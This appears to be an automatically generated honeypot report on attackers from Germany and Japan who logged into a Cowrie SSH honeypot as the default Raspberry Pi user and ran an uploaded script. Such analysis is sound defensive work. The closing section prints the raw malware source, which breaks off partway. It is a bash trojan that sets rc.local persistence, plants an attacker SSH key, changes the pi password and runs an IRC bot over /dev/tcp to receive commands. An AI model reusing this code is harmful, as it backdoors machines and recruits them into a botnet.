
# Botnet Inclusion and Propagation attempt by Attackers from Germany and Japan

<details>
<summary>
<h2>Quick Stats</h2>
</summary>


- This attack was carried out by a `3` unique source IP address(es): `93.223.169.159`, `27.93.25.111`, `111.216.194.148`
- A total of `9` sessions were logged. `6` sessions were successful logins.
- `9` login attempts were made. `6` were successful.
- `2` unique username/password pairs were attempted. `2` were successful.
- `1` unique destination ports were targeted: `2222`
- `9` unique source ports were used: `46966`, `46970`, `47004`, `52094`, `52102`, `52146`, `52912`, `52922`, `52964`
- `3` commands were input in total. `0` IP(s) and `0` URL(s) were found in the commands
- `3` unique malware samples were downloaded. `0` IP(s) and `0` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: `cowrie.log`, `cowrie.json`, `zeek.log`
- A total of `266` log events were logged in `6` log files: `cowrie.2024-01-26.json`, `cowrie.2024-01-28.log`, `cowrie.2024-01-26.log`, `cowrie.2024-01-28.json`, `conn.log`, `ssh.log`

</details>

---

# Attack Summary Report

## Executive Summary
This report details a sophisticated attack targeting a Linux honeypot. The intrusion was primarily facilitated through the exploitation of default or weak SSH credentials, leading to unauthorized system access, the deployment of a multifunctional malware, and further attack propagation attempts.

## Attack Details
- **Source IPs:**
  - 93.223.169.159 (Germany)
  - 27.93.25.111 (Japan)
  - 111.216.194.148 (Japan)
  
- **Methods:**
  - Utilization of common, weak SSH credentials (`pi` with passwords `raspberry` and `raspberryraspberry993311`) to gain initial access.
  - Installation of a Linux trojan, persisting via `rc.local` modifications and setting up a reboot mechanism.
  - Deployment of an IRC bot to establish command and control (C2) communications.
  - Execution of lateral movement techniques by scanning for and attempting to exploit other systems on the internet via SSH.
  - Potential credential compromise by changing user passwords.
  - Execution of cleanup routines to terminate certain processes and remove competition or traces.

- **Goal:**
  - Establish and maintain unauthorized access to the host system.
  - Enlist the compromised system into a botnet for ongoing C2 activities.
  - Spread the infection to additional systems by exploiting weak SSH credentials.

## Conclusion
The attackers demonstrated a clear intent to gain control of systems for malicious purposes, including botnet activities and further network compromise. Such objectives reveal a threat actor that is not only interested in immediate gains but also in sustaining a presence within compromised systems for potential long-term exploitation. The observed methods and tactics emphasize the need for robust security measures and continuous monitoring to mitigate such threats.

<details>
<summary>
<h3>Extended Summary</h3>
</summary>


- This attack was carried out by a `3` unique **source IP** address(es):
	- `SourceIP 93.223.169.159 Sessions: 3, Successful Logins: 2, Commands: 3, Downloads 1, `
	- `SourceIP 27.93.25.111 Sessions: 3, Successful Logins: 2, Commands: 3, Downloads 1, `
	- `SourceIP 111.216.194.148 Sessions: 3, Successful Logins: 2, Commands: 3, Downloads 1, `

- `9` unique **source ports** were used:
	- `Src Port: 46966 Used 1 times`
	- `Src Port: 46970 Used 1 times`
	- `Src Port: 47004 Used 1 times`
	- `Src Port: 52094 Used 1 times`
	- `Src Port: 52102 Used 1 times`
	- `Src Port: 52146 Used 1 times`
	- `Src Port: 52912 Used 1 times`
	- `Src Port: 52922 Used 1 times`
	- `Src Port: 52964 Used 1 times`

- `1` unique **destination ports** were targeted:
	- `Dst Port: `2222` Used `9` times`

- A total of `9` sessions were logged:
	- `Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s`
	- `Session fa6fb05e952d SSH 93.223.169.159:46970 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 1, Malware: 1, Duration: 0.87s`
	- `Session 3383f6a6a93c SSH 93.223.169.159:47004 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 2, Duration: 0.70s`
	- `Session b183188057b3 SSH 27.93.25.111:52094 -> 172.31.5.68:2222 Duration: 0.15s`
	- `Session a9ffcecc6796 SSH 27.93.25.111:52102 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Malware: 1, Duration: 0.57s`
	- `Session 6c83f979e0b5 SSH 27.93.25.111:52146 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.46s`
	- `Session 617df930d4a6 SSH 111.216.194.148:52912 -> 172.31.5.68:2222 Duration: 0.09s`
	- `Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Malware: 1, Duration: 0.52s`
	- `Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.28s`

- `6` were **successful logins**, 
- `3` were **failed logins**, 
- `6` had commands, 
- `3` had malware.
- `9` unique username/password pairs were attempted. `6` were successful.
- `3` commands were input in total. `0` IP(s) and `0` URL(s) were found in the commands
- `3` unique malware samples were downloaded. 
- `0` IP(s) and `0` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: 
	- `cowrie.log`
	- `cowrie.json`
	- `zeek.log`

- A total of `266` log events were logged in `6` log files: 
	- `cowrie.2024-01-26.json`
	- `cowrie.2024-01-28.log`
	- `cowrie.2024-01-26.log`
	- `cowrie.2024-01-28.json`
	- `conn.log`
	- `ssh.log`


</details>

---


<details>
<summary>
<h2>Custom Scripts Used To Generate This Report</h2>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py)
> Main script for initializing and running all analyzer objects according to command line arguments and config file

#### [attackanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/attackanalyzer.py)
> High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [baseobjects.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/baseobjects.py) | Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_ |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logparser.py) | Classes for reading all logs into Python objects with standardized keys |
| [logprocessor.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logprocessor.py) | Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met. |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirreader.py) | Reads and counts log events in Attack directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [malwareanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/malwareanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [attackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/attackmarkdownwriter.py) | Markdown writer for Attack objects following ISC format |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [runstepsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/runstepsmarkdownwriter.py) | Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode |
| [docsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/docsmarkdownwriter.py) | Markdown writer for the honeypot-ai project documentation and README |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding) |

#### [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)
> Setup script for installing the honeypot-ai project

#### [setup](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup)
> Scripts for setting up the honeypot-ai project

| Script | Description |
| --- | --- |
| [requirements.txt](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/requirements.txt) | List of all required packages for the honeypot-ai project |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |
| [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) | Utility script to sync logs from honeypot to honeypot-ai project logs directory |
| [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh) | Utility script to install Zeek on a remote honeypot |

</details>

---


<details>
<summary>
<h1>Time and Date of Activity</h1>
</summary>

First activity logged: `2024-01-26 21:59:42.976396`
* First session: `76647820c016`
* `Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s`

Last activity logged: `2024-01-28 13:19:49.426989`
* Last session: `9a98fb146784`
* `Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.28s`


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `76647820c016` | `93.223.169.159` | `46966` | `2222` | `2024-01-26 21:59:42.976396` | `2024-01-26 21:59:45.322853` | `0.346457` |
| `9a98fb146784` | `111.216.194.148` | `52964` | `2222` | `2024-01-28 13:19:48.145386` | `2024-01-28 13:19:49.426989` | `0.281603` |

The following sessions were involved in the attack:

1. **Session ID:** 76647820c016  
   **Type:** SSH  
   **Source:** 93.223.169.159:46966  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.35s  
   **Notes:** No successful login or commands recorded.

2. **Session ID:** fa6fb05e952d  
   **Type:** SSH  
   **Source:** 93.223.169.159:46970  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberry  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.87s

3. **Session ID:** 3383f6a6a93c  
   **Type:** SSH  
   **Source:** 93.223.169.159:47004  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberry  
   **Commands:** 2  
   **Duration:** 0.70s

4. **Session ID:** b183188057b3  
   **Type:** SSH  
   **Source:** 27.93.25.111:52094  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.15s  
   **Notes:** No successful login or commands recorded.

5. **Session ID:** a9ffcecc6796  
   **Type:** SSH  
   **Source:** 27.93.25.111:52102  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.57s

6. **Session ID:** 6c83f979e0b5  
   **Type:** SSH  
   **Source:** 27.93.25.111:52146  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 2  
   **Duration:** 0.46s

7. **Session ID:** 617df930d4a6  
   **Type:** SSH  
   **Source:** 111.216.194.148:52912  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.09s  
   **Notes:** No successful login or commands recorded.

8. **Session ID:** c0a95962c75a  
   **Type:** SSH  
   **Source:** 111.216.194.148:52922  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.52s

9. **Session ID:** 9a98fb146784  
   **Type:** SSH  
   **Source:** 111.216.194.148:52964  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 2  
   **Duration:** 0.28s

It appears that multiple login attempts occurred with varying degrees of success across different sessions and IPs. Some sessions were associated with the download or upload of malware, along with command executions.

<details>
<summary>
<h3>All Sessions</h3>
</summary>


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `76647820c016` | `93.223.169.159` | `46966` | `2222` | `2024-01-26 21:59:42.976396` | `2024-01-26 21:59:45.322853` | `0.346457` |
| `fa6fb05e952d` | `93.223.169.159` | `46970` | `2222` | `2024-01-26 21:59:42.991117` | `2024-01-26 21:59:44.861131` | `0.870014` |
| `3383f6a6a93c` | `93.223.169.159` | `47004` | `2222` | `2024-01-26 21:59:45.060791` | `2024-01-26 21:59:46.758792` | `0.698001` |
| `b183188057b3` | `27.93.25.111` | `52094` | `2222` | `2024-01-28 12:16:10.353211` | `2024-01-28 12:16:12.506038` | `0.152827` |
| `a9ffcecc6796` | `27.93.25.111` | `52102` | `2222` | `2024-01-28 12:16:10.780465` | `2024-01-28 12:16:12.350297` | `0.569832` |
| `6c83f979e0b5` | `27.93.25.111` | `52146` | `2222` | `2024-01-28 12:16:12.498430` | `2024-01-28 12:16:13.957344` | `0.458914` |
| `617df930d4a6` | `111.216.194.148` | `52912` | `2222` | `2024-01-28 13:19:46.122775` | `2024-01-28 13:19:48.214327` | `0.091552` |
| `c0a95962c75a` | `111.216.194.148` | `52922` | `2222` | `2024-01-28 13:19:46.451708` | `2024-01-28 13:19:47.971018` | `0.51931` |
| `9a98fb146784` | `111.216.194.148` | `52964` | `2222` | `2024-01-28 13:19:48.145386` | `2024-01-28 13:19:49.426989` | `0.281603` |

</details>

---


</details>

---


<details>
<summary>
<h1>Relevant Logs, File or Email</h1>
</summary>


## Log Stats

| Log Name | Lines |
| --- | --- |
| cowrie.log | 114 |
| cowrie.json | 78 |
| zeek.log | 74 |

## Cowrie .log Logs
Total Cowrie logs: `114`

#### First Session With Commands fa6fb05e952d Cowrie .log Logs
This sample shows the Cowrie `.log` Logs for session_id `fa6fb05e952d` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .log Logs for fa6fb05e952d</h3>
</summary>


```verilog
No cowrie.log logs found
```

</details>

---


## Cowrie .json Logs
Total Cowrie logs: `78`

#### First Session With Commands fa6fb05e952d Cowrie .json Logs
This sample shows the Cowrie `.json` Logs for session_id `fa6fb05e952d` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .json Logs for fa6fb05e952d</h3>
</summary>


```json
No cowrie.json logs found
```

</details>

---


</details>

---


<details>
<summary>
<h1>IP and Ports</h1>
</summary>

The attack involved the following IP addresses and ports:

### Source IPs:
- 93.223.169.159
- 27.93.25.111
- 111.216.194.148

### Source Ports:
- 46966
- 46970
- 47004
- 52094
- 52102
- 52146
- 52912
- 52922
- 52964

### Destination IP:
- 172.31.5.68 (Internal IP of the honeypot)

### Destination Port:
- 2222 (SSH server port on the honeypot)

<details>
<summary>
<h3>Top 3 Source Ips</h3>
</summary>

Total Source IPs: `9`
Unique: `3`

| Source IP | Times Seen |
| --- | --- |
| `93.223.169.159` | `3` |
| `27.93.25.111` | `3` |
| `111.216.194.148` | `3` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ips</h3>
</summary>

Total Destination IPs: `9`
Unique: `1`

| Destination IP | Times Seen |
| --- | --- |
| `172.31.5.68` | `9` |

</details>

---


<details>
<summary>
<h3>Top 9 Source Ports</h3>
</summary>

Total Source Ports: `9`
Unique: `9`

| Source Port | Times Seen |
| --- | --- |
| `46966` | `1` |
| `46970` | `1` |
| `47004` | `1` |
| `52094` | `1` |
| `52102` | `1` |
| `52146` | `1` |
| `52912` | `1` |
| `52922` | `1` |
| `52964` | `1` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ports</h3>
</summary>

Total Destination Ports: `9`
Unique: `1`

| Destination Port | Times Seen |
| --- | --- |
| `2222` | `9` |

</details>

---


</details>

---


# Commands Used
This attack used a total of `3` inputs to execute the following `3` commands:
The commands used during the attack and their functions are:

1. `scp -t /tmp/BUwTrLEj`
   - **Function:** This command uses the `scp` (secure copy) utility with the `-t` option to receive file(s). It is part of the SCP protocol to copy a file to the target directory `/tmp` with the name `BUwTrLEj`. The command is likely executed on the honeypot server and suggests that the attacker attempted to upload a file named `BUwTrLEj` to the `/tmp` directory of the honeypot.

2. `cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj`
   - **Function:** This is a compound command that changes the current directory to `/tmp`, makes the file `BUwTrLEj` executable with `chmod +x`, and then executes it using `bash`. It indicates that after uploading the malicious file, the attacker made it executable and ran the script or binary, which could be the malware or a script for further exploitation.

3. `./BUwTrLEj`
   - **Function:** This command executes the file `BUwTrLEj` which is assumed to be located in the current directory of the attacker's shell session. This is a direct execution command that would be used if the attacker is already in the `/tmp` directory or if the path was included in `$PATH`. The command would trigger whatever payload `BUwTrLEj` contains.

The use of the `/tmp` directory is typical in attacks as it is a world-writable directory and is intended for temporary file storage. This allows an attacker to execute a file with fewer permission issues. The sequence of commands uploaded, granted executable permissions, and attempted execution of a file presumed to be malicious, revealing an attempt to compromise the system through the execution of unauthorized code. This pattern is consistent with a common post-exploitation process where attackers aim to establish a foothold or deliver a payload on compromised systems.

<details>
<summary>
<h2>Raw Command Inputs</h2>
</summary>

The attacker entered the following `3` inputs on the honeypot system:

**Input 1:**
```bash
scp -t /tmp/BUwTrLEj
```

**Input 2:**
```bash
cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj
```

**Input 3:**
```bash
./BUwTrLEj
```

</details>

---


<details>
<summary>
<h2>Commands Explained</h2>
</summary>

The following `3` commands were executed on the honeypot system:

```bash
scp -t /tmp/BUwTrLEj
```
0The attacker attempts to **copy a file to the remote system** using `scp` with the `-t` flag indicating that the file is being transferred to the specified directory `/tmp/BUwTrLEj`
```bash
cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj
```
1After the file is transferred, the attacker **changes directory to `/tmp`**, makes the file `BUwTrLEj` **executable with `chmod +x`**, and then **executes the file** using `bash -c ./BUwTrLEj`
```bash
./BUwTrLEj
```
2The attacker directly **executes the `BUwTrLEj` file** again with `./BUwTrLEj`, possibly as a fallback if the previous execution attempt did not work or to run the file with different permissions
</details>

---



# Malware OSINT

Based on the data obtained from MalwareBazaar, ThreatFox, URLhaus, and Malpedia, here is what is known about the malware and potential exploits involved in the attack:

### Malware Hash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
- **First Seen:** July 16, 2022, on MalwareBazaar.
- **File Name:** Not specifically named, hash used as reference.
- **File Size:** 4766 bytes.
- **File Type MIME:** application/octet-stream.
- **File Type:** Potentially a shell script (.sh).
- **Delivery Method:** Other (not specified).
- **ClamAV Signature:** Detected as SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL.
- **Times Downloaded from MalwareBazaar:** 83 times.
- **Times Uploaded to MalwareBazaar:** 1 time.
- **ReversingLabs:** Identified as a suspicious Linux trojan with the name "Linux.Trojan.Generic".
  - First seen by ReversingLabs: May 12, 2021.
  - Matched by 27 out of 42 scanners (64.29% detection rate).
- **Spamhaus HBL:** Detected as suspicious.
- **InQuest:** Verdict rendered as malicious.
- **No Data in ThreatFox and URLhaus:** The hash doesn't appear to have entries in these two databases.

### Malware Hashes: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 and b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
- No data available from MalwareBazaar, ThreatFox, or URLhaus.

### Analysis:
- **Relevant Hosts:** No specific URLs or hosts were found associated with the malware samples.
- **Known Source IPs:** The malware was downloaded by the following IPs:
  - Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c by 93.223.169.159.
  - Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 by 27.93.25.111.
  - Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by 111.216.194.148.

The attackers appear to have utilized a known Linux trojan, potentially a shell script, as part of their attack. This malware has signatures that are detected by various antivirus and security tools, indicating its malicious nature. The lack of additional information about the other two hashes suggests that they might be less known or more recently developed samples. No specific exploits were extracted from these datasets, but the indicators suggest the use of trojanized Linux utilities or scripts as part of the attacker's toolkit.

# Malware Analysis

The malware that was part of the attack carries out a variety of functions aimed at establishing persistence, executing unauthorized activities, and propagating itself across networks. Below is an explanation of its functioning as extracted from the sample text:

1. **Persistence and Privilege Escalation:**
- Checks for root privileges; if not running as root, it uses `sudo` to copy itself to `/opt/` and modifies `/etc/rc.local` to ensure that it runs on every system startup.
- Issues a reboot command to make sure the changes take effect.

2. **Cleanup and Preparation:**
- Kills a variety of processes, including miners and potential previous instances of itself, indicating it doesn't want to compete for resources.
- Modifies `/etc/hosts` to prevent communication with certain domains (`bins.deutschland-zahlung.eu`).
- Removes `.bashrc` from root and the user `pi` to prevent loading of environment variables.
- Changes the password for the user `pi`.

3. **Maintaining Access:**
- Sets up an SSH key for root, allowing for passwordless access to the compromised machine.
- Adjusts `/etc/resolv.conf` to set the Google DNS server as the nameserver, potentially to ensure network connectivity.

4. **Botnet Functionality:**
- Creates a bot script that generates a semi-random nickname and connects to different IRC servers using hardcoded addresses and joins a specific channel.
- Uses a public key to verify commands received over IRC, executes them, and sends the results back to the sender encoded in base64.
- Runs the bot script in the background to maintain the botnet connection.

5. **Propagation:**
- Installs `zmap` and `sshpass` to facilitate network scanning and SSH brute-force attempts.
- Uses `zmap` to scan for SSH services on port 22 and attempts to copy itself to other systems using common credentials "raspberry" and "raspberryraspberry993311".
- Executes itself on any new machines it manages to transfer to, spreading the infection.

6. **Other Malicious Activities:**
- Contains hardcoded paths and commands for removing other specific malware, suggesting attempts to clean competing infections or traces of its activities.

This malware is sophisticated and multipurpose, built to sustain prolonged access to compromised systems, participate in botnet activities, and self-propagate to other vulnerable machines. It indicates a calculated and extensive compromise, with the attackers orchestrating a systematic network breach and actively seeking to broaden their reach.
This attack downloaded `3` raw malware samples which can be standardized into `1` samples:

### Raw Malware Sample

<details>
<summary>
<h4>Raw Malware Sample 0/1 Sha256 HASH: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c</h4>
</summary>

**Standardized** Sha256 HASH: `f7bbaf20a0b5d98b0e333ae777118fd19a1c26ff47c5fd063e4c1933dc0b22fc`

**Sample Below** Sha256 HASH: `10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c`
```bash
C0755 4745 0X6mZEHu
#!/bin/bash

MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG

if [ "$EUID" -ne 0 ]
then 
	NEWMYSELF=`mktemp -u 'XXXXXXXX'`
	sudo cp $MYSELF /opt/$NEWMYSELF
	sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
	sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
	sudo sh -c "echo 'exit 0' >> /etc/rc.local"
	sleep 1
	sudo reboot
else
TMP1=`mktemp`
echo $TMP1 >> $DEBUG

killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl

echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc

usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys

echo "nameserver 8.8.8.8" >> /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten

cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER

BOT=`mktemp -u 'XXXXXXXX'`

cat > /tmp/$BOT <<'EOFMARKER'
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

	arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

	echo $NICK

	eval 'printf "NICK $NICK\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

	# Main loop
	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "PING" ]] ; then
			printf "PONG %s\n" "${msg_in:5}";
			eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "JOIN #biret\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
